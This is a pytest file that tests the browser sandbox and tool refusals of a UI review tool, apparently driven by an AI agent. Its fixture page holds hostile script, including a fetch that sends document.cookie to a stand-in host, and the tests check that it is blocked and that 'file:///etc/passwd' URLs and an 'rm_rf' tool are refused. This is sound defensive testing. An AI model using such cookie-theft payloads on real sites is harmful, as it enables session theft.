"""Security: the browser sandbox and the tools' refusals, against a recording server."""

from __future__ import annotations

from collections.abc import Callable
from collections.abc import Iterator
from pathlib import Path

import pytest

from tests.conftest import RecordingServer
from tests.conftest import base_config
from ui_review.browser import BrowserSession
from ui_review.scope import Scope
from ui_review.tools import Environment

pytestmark = pytest.mark.browser

PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Sandbox</title></head>
<body><main>
<h1>Sandbox</h1>
<form id="get-form" method="get" action="search.html"><input name="q" value="x">
  <button id="get-submit">Search</button></form>
<form id="post-form" method="post" action="buy"><button id="buy" type="submit">Buy</button>
  <input id="img-submit" type="image" alt="Buy" src="b.png"></form>
<button id="toggle" type="button" onclick="document.getElementById('menu').hidden=false">Menu</button>
<nav id="menu" hidden><a href="other.html">Other</a></nav>
<a id="away" href="https://elsewhere.example/">Away</a>
<a id="js" href="javascript:void(0)" onclick="console.error('clicked js link')">JS</a>
<script>
  fetch("api", {method: "POST", body: "x"}).catch(() => {});
  fetch("api", {method: "DELETE"}).catch(() => {});
  fetch("https://elsewhere.example/steal?c=" + document.cookie).catch(() => {});
  try { new WebSocket("ws://" + location.host + "/ws"); } catch (e) {}
  document.getElementById("post-form").submit();
  window.open("other.html");
  alert("hello");
</script>
</main></body></html>"""


@pytest.fixture
def env(
    browser_ok: bool, tmp_path: Path, recording_server: Callable[[Path], RecordingServer]
) -> Iterator[tuple[Environment, RecordingServer]]:
    site = tmp_path / "site"
    site.mkdir()
    (site / "index.html").write_text(PAGE)
    (site / "other.html").write_text("<!doctype html><title>Other</title><p>other</p>")
    server = recording_server(site)
    cfg = base_config(target=server.url, out_dir=tmp_path / "out", max_pages=2)
    scope = Scope(server.url + "/")
    with BrowserSession(cfg, scope) as session:
        yield Environment(cfg, scope, session), server


def test_page_scripts_cannot_send_writes_or_leave(env: tuple[Environment, RecordingServer]) -> None:
    e, server = env
    assert e.goto("/").ok
    e.scroll("bottom")
    kinds = {(b.method, b.url.split("?")[0]) for b in e.session.blocked}
    base = server.url
    assert ("POST", f"{base}/api") in kinds
    assert ("DELETE", f"{base}/api") in kinds
    assert ("GET", "https://elsewhere.example/steal") in kinds
    assert any(b.method == "WEBSOCKET" for b in e.session.blocked)
    assert not any(p.startswith("/ws") for _, p in server.requests)
    assert {m for m, _ in server.requests} == {"GET"}
    # form.submit() was a no-op and window.open/alert didn't hang the run.
    assert e.current is not None and e.current.page.url.rstrip("/") == base
    assert len(e.current.context.pages) == 1


def test_click_refuses_form_submission_and_leaving(
    env: tuple[Environment, RecordingServer],
) -> None:
    e, server = env
    e.goto("/")
    for selector in ("#buy", "#get-submit", "#img-submit"):
        result = e.call("click", {"selector": selector})
        assert not result.ok and "submits a form" in result.summary
    away = e.call("click", {"selector": "#away"})
    assert not away.ok and "leaves the review scope" in away.summary
    missing = e.call("click", {"selector": "#nope"})
    assert not missing.ok and "no element" in missing.summary
    # Pressing Enter in a field would submit too: the guard cancels the submit event.
    e.current.page.press("input[name=q]", "Enter")
    e.current.page.wait_for_timeout(200)
    assert not any("search.html" in p for _, p in server.requests)
    assert {m for m, _ in server.requests} == {"GET"}


def test_click_opens_menus_and_follows_in_scope_links(
    env: tuple[Environment, RecordingServer],
) -> None:
    e, _ = env
    e.goto("/")
    assert e.call("click", {"selector": "#toggle"}).ok
    js = e.call("click", {"selector": "#js"})
    assert js.ok
    e.flush(e.current)
    assert any("clicked js link" in f.title for f in e.findings.by_check("console-error"))
    nav = e.call("click", {"selector": "#menu a"})
    assert nav.ok and "other.html" in nav.summary
    assert any(u.endswith("/other.html") for u in e.pages)


def test_goto_refuses_out_of_scope_and_over_budget(
    env: tuple[Environment, RecordingServer],
) -> None:
    e, server = env
    for url in (
        "https://elsewhere.example/",
        "file:///etc/passwd",
        "javascript:alert(1)",
        "/report.pdf",
    ):
        result = e.goto(url)
        assert not result.ok and "outside the review scope" in result.summary
    assert e.goto("/").ok and e.goto("/other.html").ok
    over = e.goto("/third.html")
    assert not over.ok and "page budget" in over.summary
    assert not e.goto("/", viewport="watch").ok
    assert not any("third" in p for _, p in server.requests)


def test_tool_errors_never_raise(env: tuple[Environment, RecordingServer]) -> None:
    e, _ = env
    assert not e.call("screenshot", {}).ok  # nothing open yet
    assert "unknown tool" in e.call("rm_rf", {}).summary
    assert "bad arguments" in e.call("goto", {"nope": 1}).summary
    e.goto("/")
    assert not e.call("scroll", {"to": "sideways"}).ok
    assert e.call("scroll", {"to": "120"}).ok
    assert "Vision pass is off" in e.call("critique", {}).summary
    assert "No baseline" in e.call("compare_baseline", {}).summary
